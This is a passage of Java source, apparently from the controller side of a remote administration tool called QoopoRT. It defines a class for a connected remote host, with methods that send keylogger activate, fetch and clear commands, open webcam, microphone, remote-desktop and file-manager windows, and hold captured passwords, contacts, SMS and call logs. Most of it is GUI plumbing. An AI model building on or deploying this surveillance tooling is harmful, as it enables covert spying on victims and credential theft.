            QoopoRT.instancia.contadorSubida.agregar(enviados);
            QoopoRT.instancia.contadorTotalSubida.agregar(enviados);
        }
    }

    public void agregarRecibidos(long recibidos) {
        bytesRecibidos += recibidos;
        if (QoopoRT.instancia != null) {
            QoopoRT.instancia.contadorBajada.agregar(recibidos);
            QoopoRT.instancia.contadorTotalBajada.agregar(recibidos);
        }
//        QoopoRT.instancia.actualizarDatosServidor(this);
    }

    public ImageIcon getVistaPreviaWC() {
        return vistaPreviaWC;
    }

    public void setVistaPreviaWC(ImageIcon vistaPreviaWC) {
        this.vistaPreviaWC = vistaPreviaWC;
    }

    public boolean isPidiendoVistaPreviaWC() {
        return pidiendoVistaPreviaWC;
    }

    public void setPidiendoVistaPreviaWC(boolean pidiendoVistaPreviaWC) {
        this.pidiendoVistaPreviaWC = pidiendoVistaPreviaWC;
    }

    public ImageIcon getUsuarioAvatar() {
        return usuarioAvatar;
    }

    public void setUsuarioAvatar(ImageIcon usuarioAvatar) {
        this.usuarioAvatar = usuarioAvatar;
    }

    public void activarKeyLogger() {
        enviarComando(Protocolo.KEYLOGGER_ACTIVAR);
    }

    public void detenerKeyLogger() {
        enviarComando(Protocolo.KEYLOGGER_DETENER);
    }

    public void pedirKeyLoggerTexto() {
        enviarComando(Protocolo.KEYLOGGER_GET_TEXT);
    }

    public void vaciarKeyLogger() {
        enviarComando(Protocolo.KEYLOGGER_VACIAR);
    }

    public void listarEquiposRed() {
        enviarComando(Protocolo.GET_LISTA_EQUIPOS_RED);
    }

    public File getfKeylogger() {
        return fKeylogger;
    }

    public void setfKeylogger(File fKeylogger) {
        this.fKeylogger = fKeylogger;
    }

    public boolean isConexionInversa() {
        return tipoconexionI__D == 1;
    }

    public boolean isConexionDirecta() {
        return tipoconexionI__D == 2;
    }

    public int getPuertoTransferencia() {
        return puertoTransferencia;
    }

    public void setPuertoTransferencia(int puertoTransferencia) {
        this.puertoTransferencia = puertoTransferencia;
    }

    public int getTipoconexionI__D() {
        return tipoconexionI__D;
    }

    public void setTipoconexionI__D(int tipoconexionI__D) {
        this.tipoconexionI__D = tipoconexionI__D;
    }

    public String getHostConexion() {
        return hostConexion;
    }

    public void setHostConexion(String hostConexion) {
        this.hostConexion = hostConexion;
    }

    public int getPuerto() {
        return puerto;
    }

    public void setPuerto(int puerto) {
        this.puerto = puerto;
    }

    public EscritorioRemoto getEscritorioRemoto() {
        return escritorioRemoto;
    }

    public void setEscritorioRemoto(EscritorioRemoto escritorioRemoto) {
        this.escritorioRemoto = escritorioRemoto;
    }

    public Camara getCamara() {
        return camara;
    }

    public void setCamara(Camara camara) {
        this.camara = camara;
    }

    public AdminArchivos getAdminArchivos() {
        return adminArchivos;
    }

    public void setAdminArchivos(AdminArchivos adminArchivos) {
        this.adminArchivos = adminArchivos;
    }

    public VoIp getVopIp() {
        return vopIp;
    }

    public void setVopIp(VoIp vopIp) {
        this.vopIp = vopIp;
    }

    public Passwords getPasswords() {
        return passwords;
    }

    public void setPasswords(Passwords passwords) {
        this.passwords = passwords;
    }

    public Contactos getContactos() {
        return contactos;
    }

    public void setContactos(Contactos contactos) {
        this.contactos = contactos;
    }

    public SMSListar getSmsListar() {
        return smsListar;
    }

    public void setSmsListar(SMSListar smsListar) {
        this.smsListar = smsListar;
    }

    public Llamadas getLlamadas() {
        return llamadas;
    }

    public void setLlamadas(Llamadas llamadas) {
        this.llamadas = llamadas;
    }

    public Informacion getInformacionGUI() {
        return informacionGUI;
    }

    public void setInformacionGUI(Informacion informacionGUI) {
        this.informacionGUI = informacionGUI;
    }

    public Portapapeles getPortapapeles() {
        return portapapeles;
    }

    public void setPortapapeles(Portapapeles portapapeles) {
        this.portapapeles = portapapeles;
    }

    public KeyLogger getKeylogger() {
        return keylogger;
    }

    public void setKeylogger(KeyLogger keylogger) {
        this.keylogger = keylogger;
    }

    public Terminal getConsola() {
        return consola;
    }

    public void setConsola(Terminal consola) {
        this.consola = consola;
    }

    public Procesos getProcesos() {
        return procesos;
    }

    public void setProcesos(Procesos procesos) {
        this.procesos = procesos;
    }

    public Conexiones getConexiones() {
        return conexiones;
    }

    public void setConexiones(Conexiones conexiones) {
        this.conexiones = conexiones;
    }

    public Chat getChat() {
        return chat;
    }

    public void setChat(Chat chat) {
        this.chat = chat;
    }

    public ArchivosOffline getArchivosOffline() {
        return archivosOffline;
    }

    public void setArchivosOffline(ArchivosOffline archivosOffline) {
        this.archivosOffline = archivosOffline;
    }

    public RedLan getRedLan() {
        return redLan;
    }

    public void setRedLan(RedLan redLan) {
        this.redLan = redLan;
    }

    public Mensajes getVenMensaje() {
        return venMensaje;
    }

    public void setVenMensaje(Mensajes venMensaje) {
        this.venMensaje = venMensaje;
    }

    public TextoSpeak getVenTextoSpeak() {
        return venTextoSpeak;
    }

    public void setVenTextoSpeak(TextoSpeak venTextoSpeak) {
        this.venTextoSpeak = venTextoSpeak;
    }

    public MonitorSistemaAsociado getMonitorSistema() {
        return monitorSistema;
    }

    public void setMonitorSistema(MonitorSistemaAsociado monitorSistema) {
        this.monitorSistema = monitorSistema;
    }

    public Mapa getMapa() {
        return mapa;
    }

    public void setMapa(Mapa mapa) {
        this.mapa = mapa;
    }

    public Plugins getPlugins() {
        return plugins;
    }

    public void setPlugins(Plugins plugins) {
        this.plugins = plugins;
    }

    public String getTipoConexionSTR() {
        switch (conexion.getTipo()) {
            case ConexionServer.TCP:
                return "TCP";
            case ConexionServer.UDP:
                return "UDP";
        }
        return "N/A";

    }

    public boolean isAbrirEscritoriRemotoAlconectar() {
        return abrirEscritoriRemotoAlconectar;
    }

    public void setAbrirEscritoriRemotoAlconectar(boolean abrirEscritoriRemotoAlconectar) {
        this.abrirEscritoriRemotoAlconectar = abrirEscritoriRemotoAlconectar;
    }

    public Conexion getConexion() {
        return conexion;
    }

    public void setConexion(Conexion conexion) {
        this.conexion = conexion;
    }

    public void recibirNoWebCam() {
        if (camara != null) {
            if (!camara.isVisible()) {
                camara.setVisible(true);
            }
            camara.getItmSubirPlugin().setVisible(true);
        }
    }

    public void abrirAdminArchivos() {
        try {
            if (adminArchivos == null) {
                adminArchivos = new AdminArchivos(this);
                adminArchivos.setVisible(true);
                GuiUtil.centrarVentana(adminArchivos, 600, 600);
                adminArchivos.setTitle("Administrador de Archivos [" + getInformacion() + "]");
                listarDrives();
            } else {
                if (!adminArchivos.isVisible()) {
                    adminArchivos.setVisible(true);
                }
                adminArchivos.setTitle("Administrador de Archivos [" + getInformacion() + "]");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void enviarArchivosPortapapeles() {

    }

    public void recibirArchivosPortapapeles() {

    }

    public void abrirVentanaChat() {
        try {
            if (chat == null) {
                chat = new Chat(this);
                chat.setVisible(true);
                GuiUtil.centrarVentana(chat);
                chat.setTitle("Chat [" + getInformacion() + "]");
            } else {
                if (!chat.isVisible()) {
                    chat.setVisible(true);
                }
                chat.setTitle("Chat [" + getInformacion() + "]");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void abrirEscritorioRemoto() {
        try {
            //capPantalla = (EscritorioRemoto) QoopoRT.capturasEscritorio.get(tmp.getIdentificador());
            if (escritorioRemoto == null) {
                escritorioRemoto = new EscritorioRemoto(null, this);
                escritorioRemoto.setVisible(true);
                GuiUtil.centrarVentana(escritorioRemoto, 600, 400); //quitar jframe
            } else if (!escritorioRemoto.isVisible()) {
                escritorioRemoto.setVisible(true);
            }
            listarMonitores();
            listarResolucionesMonitor();
            pedirResolucionPantalla();

            if (accionAbrirEscritorio != null) {
                accionAbrirEscritorio.ejecutar();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void abrirVentanaCamara() {
        try {
            if (camara == null) {
                camara = new Camara(null, this);
                GuiUtil.centrarVentana(camara, 600, 400);
            } else if (!camara.isVisible()) {
                camara.setVisible(true);
            }
            listarWebCams();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void cerrarEscritorioRemoto() {
        if (escritorioRemoto != null) {
            escritorioRemoto.dispose();
            setEscritorioRemoto(null);
        }
    }

    public void cerrarVoIP() {
        if (vopIp != null) {
            vopIp.dispose();
            setVopIp(null);
        }
    }

    public void cerrarArchivos() {
        if (adminArchivos != null) {
            adminArchivos.dispose();
            setAdminArchivos(null);
        }
    }

    public void cerrarCamara() {
        if (camara != null) {
            camara.dispose();
            setCamara(null);
        }
    }

    public void abrirVoIP() {
        try {
            if (vopIp == null) {
                vopIp = new VoIp(null, this);
                vopIp.setVisible(true);
                GuiUtil.centrarVentana(vopIp, 300, 130);
                vopIp.setTitle("VoIP [" + getInformacion() + "]");

            } else {
                if (!vopIp.isVisible()) {
                    vopIp.setVisible(true);
                }
                vopIp.setTitle("VoIP [" + getInformacion() + "]");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void abrirVentanaInformacion() {
        try {
            if (informacionGUI == null) {
                informacionGUI = new Informacion(this);
                informacionGUI.setVisible(true);
                GuiUtil.centrarVentana(informacionGUI);
                informacionGUI.setTitle("Información [" + getInformacion() + "]");
            } else {
                if (!informacionGUI.isVisible()) {
                    informacionGUI.setVisible(true);
                }
                informacionGUI.setTitle("Información [" + getInformacion() + "]");
            }

            pedirInfoCompleta();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void abrirVentanaPortapapeles() {
        try {
            if (portapapeles == null) {
                portapapeles = new Portapapeles(this);
                portapapeles.setVisible(true);
                GuiUtil.centrarVentana(portapapeles);
                portapapeles.setTitle("Portapapeles [" + this.getInformacion() + "]");

            } else {
                if (!portapapeles.isVisible()) {
                    portapapeles.setVisible(true);
                }
                portapapeles.setTitle("Portapapeles [" + getInformacion() + "]");
            }
            this.pedirPortapapeles();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void abrirVentanaProcesos() {
        try {
            if (procesos == null) {
                procesos = new Procesos(this);
                procesos.setVisible(true);
                GuiUtil.centrarVentana(procesos);
                procesos.setTitle("Procesos [" + getInformacion() + "]");

            } else {
                if (!procesos.isVisible()) {
                    procesos.setVisible(true);
                }
                procesos.setTitle("Procesos [" + getInformacion() + "]");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void abrirVentanaConexiones() {
        try {

            if (conexiones == null) {
                conexiones = new Conexiones(this);
                conexiones.setVisible(true);
                GuiUtil.centrarVentana(conexiones);
                conexiones.setTitle("Conexiones [" + getInformacion() + "]");

            } else {
                if (!conexiones.isVisible()) {
                    conexiones.setVisible(true);
                }
                conexiones.setTitle("Conexiones [" + getInformacion() + "]");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void abrirVentanaMonitorAsociado() {
        try {
            if (monitorSistema == null) {
                monitorSistema = new MonitorSistemaAsociado(this);
                GuiUtil.centrarVentana(monitorSistema, 600, 550);
            } else if (!monitorSistema.isVisible()) {
                monitorSistema.setVisible(true);
            }

            monitorSistema.setTitle("Monitor del Sistema [" + getInformacion() + "]");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void abrirVentanaPlugins() {
        try {
            if (plugins == null) {
                plugins = new Plugins(this);
                GuiUtil.centrarVentana(plugins, 600, 550);
            } else if (!plugins.isVisible()) {
                plugins.setVisible(true);
            }

            plugins.setTitle("Plugins [" + getInformacion() + "]");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void desconectar() {
        //espera cuarto de segundo
        try {
            Thread.sleep(250);
        } catch (Exception e) {

        }
        //garantizo el cierre de la conexion
        try {
            conexion.cerrar();
        } catch (IOException ex1) {

        }
        this.quitarServidor();
        if (accionDesconectar != null) {
            accionDesconectar.ejecutar();
        }
    }

    public Accion getAccionListo() {
        return accionListo;
    }

    public void setAccionListo(Accion accionListo) {
        this.accionListo = accionListo;
    }

    public Accion getAccionInfo() {
        return accionInfo;
    }

    public void setAccionInfo(Accion accionInfo) {
        this.accionInfo = accionInfo;
    }

    public Accion getAccionAutenticar() {
        return accionAutenticar;
    }

    public void setAccionAutenticar(Accion accionAutenticar) {
        this.accionAutenticar = accionAutenticar;
    }

    public Accion getAccionAbrirEscritorio() {
        return accionAbrirEscritorio;
    }

    public void setAccionAbrirEscritorio(Accion accionAbrirEscritorio) {
        this.accionAbrirEscritorio = accionAbrirEscritorio;
    }

    public Accion getAccionDesconectar() {
        return accionDesconectar;
    }

    public void setAccionDesconectar(Accion accionDesconectar) {
        this.accionDesconectar = accionDesconectar;
    }

    public boolean isSsl() {
        return ssl;
    }

    public void setSsl(boolean ssl) {
        this.ssl = ssl;
    }

    public void restarEnvio() {
        colaEnvio.restarEnvio();
    }

    /**
     * Setea el limite de la cola de envio , si no se llama el limite sera
     * infinito
     */
    public void setLimiteFinito() {
        colaEnvio.setMaximo(3);
    }

    public abstract void enviarComando(int i, Object... cmd);

    public class TareaPing extends Thread {

        public TareaPing() {

        }

        @Override
        public void run() {
            try {
                hacerPing();
            } catch (Exception e) {
            }
        }
    }

}
